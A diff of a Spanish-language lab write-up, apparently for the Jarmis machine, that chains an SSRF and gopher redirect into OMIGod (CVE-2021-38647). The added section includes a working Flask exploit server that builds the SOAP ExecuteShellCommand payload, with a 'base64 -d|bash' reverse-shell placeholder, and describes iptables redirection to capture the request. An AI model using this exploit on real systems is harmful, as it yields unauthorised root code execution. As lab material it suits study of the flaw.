@@ -133,7 +133,9 @@ El resultado confirmó la presencia de los puertos 22/TCP y 80/TCP, ya conocidos
 
 La identificación de estos puertos motivó una investigación adicional sobre vulnerabilidades asociadas a OMI. Una búsqueda preliminar reveló CVE 2021 38647, conocida como OMIGod, una vulnerabilidad crítica que afectó a la implementación de OMI desarrollada por Microsoft. Este fallo, ampliamente documentado, se originaba en una gestión defectuosa de las cabeceras de autenticación: el servicio aceptaba peticiones POST sin validar adecuadamente la presencia de credenciales, lo que permitía la ejecución remota de código con privilegios de root mediante una única solicitud especialmente construida.
 
-La explotación de CVE 2021 38647 requiere la capacidad de emitir una petición POST directamente al servicio OMI. Sin embargo, en este escenario, los puertos 5985 y 5986 se encuentran expuestos únicamente en la interfaz interna del host, lo que imposibilita su acceso directo desde el exterior. En consecuencia, resulta imprescindible identificar un mecanismo que permita redirigir o encapsular solicitudes hacia puertos internos, lo que nos conduce a evaluar la existencia de endpoints vulnerables a Server Side Request Forgery (SSRF) dentro de la API de Jarmis.
+La explotación de CVE-2021-38647 requiere la capacidad de emitir una petición POST directamente al servicio OMI. Sin embargo, en este escenario, los puertos 5985 y 5986 se encuentran expuestos únicamente en la interfaz interna del host, lo que imposibilita su acceso directo desde el exterior. En consecuencia, resulta imprescindible identificar un mecanismo que permita redirigir o encapsular solicitudes hacia puertos internos, lo que nos conduce a evaluar la existencia de endpoints vulnerables a Server Side Request Forgery (SSRF) dentro de la API de Jarmis.
+
+Dado que el endpoint /fetch ya ha demostrado la capacidad de inducir conexiones salientes hacia destinos arbitrarios, la siguiente fase del análisis se orienta a determinar si esta funcionalidad puede ampliarse para emitir solicitudes POST, o si existe algún otro endpoint que permita manipular la naturaleza de la petición enviada por el backend. La identificación de un SSRF con capacidad de modificar el método HTTP constituiría un vector de explotación directo para desencadenar OMIGod y obtener ejecución remota de código con privilegios elevados.
 
 <p align="center"><strong>Dumping the database</strong></p>
 
@@ -302,15 +304,59 @@ Esta secuencia, correspondiente a un retorno de carro y salto de línea, implica
 
 Este hallazgo es crítico para la fase siguiente: la construcción del URL Gopher que encapsulará la petición POST dirigida a localhost:5985. La precisión en el cálculo de la longitud del cuerpo es indispensable para evitar errores de parsing en el servicio OMI y garantizar que la carga SOAP XML sea procesada correctamente. Con la cadena de redirección plenamente operativa y el comportamiento del esquema Gopher validado, el entorno está preparado para forjar la petición POST definitiva que desencadenará la vulnerabilidad OMIGod mediante SSRF.
 
-Remote Shell
+<p align="center"><strong>Remote Shell</strong></p>
 
 Para integrar el proof of concept de OMIGod en la cadena de explotación construida hasta este punto, se procedió a adaptar el payload SOAP XML utilizado en la vulnerabilidad. El POC original define una variable DATA que contiene la estructura completa de la petición, incluyendo el elemento <p:command>, donde se inserta la instrucción arbitraria que será ejecutada con privilegios de root. Este campo se sustituyó por {}, permitiendo rellenarlo dinámicamente mediante .format(), lo que facilita la incorporación de cargas útiles personalizadas.
 
- 
+```python
+from flask import Flask, redirect
+from urllib.parse import quote
+app = Flask(__name__)
 
+DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
+   <s:Header>
+      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
+      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
+      <a:ReplyTo>
+         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+      </a:ReplyTo>
+      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
+      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
+      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
+      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
+      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
+      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
+      <w:OptionSet s:mustUnderstand="true" />
+      <w:SelectorSet>
+         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
+      </w:SelectorSet>
+   </s:Header>
+   <s:Body>
+      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
+         <p:command>{}</p:command>
+         <p:timeout>0</p:timeout>
+      </p:ExecuteShellCommand_INPUT>
+   </s:Body>
+</s:Envelope>
+"""
+REQUEST = """POST / HTTP/1.1\r
+Host: localhost:5985\r
+User-Agent: curl/7.74.0\r
+Content-Length: {length}\r
+Content-Type: application/soap+xml;charset=UTF-8\r
+\r
+{body}"""
 
-
-
+@app.route('/')
+def root():
+	cmd="echo '<PAYLOAD BASE64 REVERSE SHELL'|base64 -d|bash"
+	data = DATA.format(cmd)
+	req = REQUEST.format(length=len(data)+2, body=data)
+	enc_req = quote(req, safe='')
+	return redirect(f'gopher://127.0.0.1:5985/_{enc_req}', code=301)
+if __name__ == "__main__":
+	app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+``` 
 
 Paralelamente, se elaboró una plantilla para la petición HTTP (REQUEST), incorporando los encabezados necesarios, el campo Content-Length y el cuerpo XML. Dado que el protocolo HTTP exige la secuencia \r\n como delimitador de líneas, y Python en entornos Linux interpreta los saltos de línea únicamente como \n, fue necesario insertar explícitamente los caracteres \r para garantizar la correcta construcción de la petición. Este detalle es crítico, ya que cualquier discrepancia en la estructura de los encabezados puede provocar que el servicio OMI rechace la solicitud.
 
@@ -320,7 +366,22 @@ La función quote se empleó para URL codificar la cadena completa, asegurando q
 
 Una vez ensamblada la petición final, se envió el URL Gopher a través del endpoint de Jarmis. La cadena de redirección se ejecutó correctamente, y el servicio OMI procesó la solicitud POST construida manualmente. Instantes después, se recibió una conexión entrante que estableció una reverse shell con privilegios de root, confirmando la explotación exitosa de CVE 2021 38647 (OMIGod) mediante un vector de Server Side Request Forgery.
 
+<img src="assets/49.png">
 
+Como vía alternativa al uso de módulos personalizados en Metasploit, se optó por instrumentalizar el flujo de red mediante reglas de traducción de direcciones (NAT) en el firewall del sistema. Esta aproximación permite interceptar y redirigir paquetes específicos sin depender de un framework externo, manteniendo un control granular sobre la capa de transporte.
 
+La primera instrucción elimina todas las reglas existentes en la tabla nat, garantizando un entorno limpio y evitando interferencias con configuraciones previas. A continuación, se inserta una regla en la cadena PREROUTING, responsable de procesar los paquetes antes de que sean enrutados por el sistema. La regla se aplica al tráfico TCP dirigido al puerto 443, que corresponde al canal TLS utilizado por Jarmis para establecer las conexiones salientes.
 
-Dado que el endpoint /fetch ya ha demostrado la capacidad de inducir conexiones salientes hacia destinos arbitrarios, la siguiente fase del análisis se orienta a determinar si esta funcionalidad puede ampliarse para emitir solicitudes POST, o si existe algún otro endpoint que permita manipular la naturaleza de la petición enviada por el backend. La identificación de un SSRF con capacidad de modificar el método HTTP constituiría un vector de explotación directo para desencadenar OMIGod y obtener ejecución remota de código con privilegios elevados.
+El módulo statistic se emplea en modo nth, lo que permite seleccionar paquetes según su posición en la secuencia. En este caso, la configuración --every 11 --packet 10 indica que se interceptará el décimo paquete de cada grupo de once, coincidiendo con el flujo adicional que Jarmis genera al intentar obtener metadatos del servidor remoto. Este detalle es crucial, ya que permite aislar la undécima conexión TLS —la que se utiliza para la fase de inspección— sin afectar las diez negociaciones estándar del fingerprinting JARM.
+
+La acción definida por la regla (-j REDIRECT) redirige el tráfico interceptado hacia el puerto 8443, donde se encuentra el listener configurado con ncat. De este modo, el sistema actúa como un proxy transparente: los paquetes destinados originalmente al puerto 443 son desviados hacia el servicio de escucha, permitiendo capturar y analizar la solicitud sin alterar el resto del tráfico TLS.
+
+<img src="assets/50.png">
+
+El resultado práctico es una conexión entrante hacia el puerto 443, seguida de una petición redirigida hacia el puerto 8443, donde se recibe la interacción completa. 
+
+<img src="assets/51.png">
+
+Esta técnica demuestra que la manipulación del firewall puede sustituir eficazmente la lógica de redirección implementada en Metasploit, proporcionando una vía directa para interceptar y reenviar la solicitud crítica que habilita la explotación del vector SSRF y, en última instancia, la vulnerabilidad OMIGod.
+
+<img src="assets/52.png">
